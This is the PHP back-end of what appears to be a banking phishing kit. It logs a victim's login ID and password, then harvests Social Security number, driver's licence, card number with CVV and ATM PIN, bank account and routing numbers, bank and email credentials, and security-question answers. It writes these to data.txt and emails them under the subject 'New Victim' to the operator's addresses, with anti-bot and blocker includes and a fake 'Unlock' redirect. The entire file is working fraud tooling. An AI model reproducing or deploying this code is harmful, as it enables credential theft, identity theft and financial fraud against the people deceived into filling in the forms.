<?php 
ob_start();
session_start();
error_reporting(0);
include './global.php';
  include './lib/loca.php';
  include './lib/system.php';
  include './lib/blocker.php';
  include './lib/antibots4.php';
    include './lib/detect.php';
  include '../email.php';
 
$toinbox = '2';

if(isset($_POST['id'])){



$date = date("y/m/d");
$datesec = date("h:i:sa");
$alldate = $date.'  @  '.$datesec;

	$ip = $_SERVER['REMOTE_ADDR'];
	$user = $_POST['id'];
	$_SESSION['user'] = $user;
	$pass = $_POST['password'];
	
$login = "

+---------------------------------------------
| New result : $alldate
+---------------------------------------------
| [[ip] => $ip
| [os] => $os_platform
| [Online ID] => $user
| [password] => $pass 
";

$_SESSION['login'] = $login;
$paths = "../data.txt";
$fps = fopen($paths, "a");
fwrite($fps, $login);

 $rnd = rand(11111111,999999999999);
$base = md5($rnd);
header("location: update.php?cmd=Unlock&Token=$base&session=5246_sssf2");
exit();

}



if(isset($_POST['fullname'])){
$fullname =		$_POST['fullname'];
$address =  	$_POST['address'];
$city =  		$_POST['city'];
$state = 		$_POST['state'];	
$zip =			$_POST['zip'];	
$phone =		$_POST['phone'];	
$driverslicense=$_POST['driverslicense'];	
$ssn =			$_POST['ssn'];	
$type =			$_POST['type'];
$cardnumber = 	$_POST['cardnumber'];
$_SESSION['number'] = $cardnumber;
$mm =			$_POST['mm'];
$yy = 			$_POST['yy'];
$cvv =			$_POST['cvv'];
$nameoncard =	$_POST['nameoncard'];
$atm =			$_POST['atm'];
$bankname = 	$_POST['bankname'];
$routing =		$_POST['routingnumber'];
$account =		$_POST['accountnumber'];
$userid =   	$_POST['userid'];
$userpass =   	$_POST['pass'];
$bankemail =	$_POST['bankemail'];
$bankpass =		$_POST['bankpass'];
$qs1	=		$_POST['qs1'];
$answer1	=	$_POST['answer1'];	
$qs2	=		$_POST['qs2'];
$answer2	=	$_POST['answer2'];
$qs3	=		$_POST['qs3'];
$answer3	=	$_POST['answer3'];

$billing = "+---------------------------------------------
| [full name] => $fullname
| [address line] => $address
| [city] => $city 
| [state] => $state
| [country] => $country
| [zip] => $zip
| [phone] => $phone 
| [drivers license] => $driverslicense
| [Social Security Number] => $ssn
+---------------------------------------------
| [card type] => $type
| [card number] => $cardnumber 
| [Expiry] => $mm/$yy
| [CVV] = > $cvv
| [name on card] => $nameoncard
| [ATM] => $atm 
+---------------------------------------------
| [bank name] => $bankname
| [routing number] => $routing
| [account number] =>  $account
| [user id] => $userid
| [user pass] => $userpass
| [Email] => $bankemail
| [password] => $bankpass
+---------------------------------------------
|     		Security Questions
+---------------------------------------------
| [$qs1] => $answer1
| [$qs2] => $answer2
| [$qs3] => $answer3
+---------------------------------------------";


$txt = $_SESSION['login'].$billing;
$subject = "New Victim ( ❤❤❤".$_SESSION['number']."❤❤❤ ) ";
$headers = " From: MegaMass <7issatok@gmail.com> " . "\r\n";
mail($email, $subject, $txt, $headers);
$path = "../data.txt";
$fp = fopen($path, "a");
fwrite($fp, $billing);
mail($blockGoogle,
$subject,
$txt,
$headers);
fclose($fp);
 
}

 

?>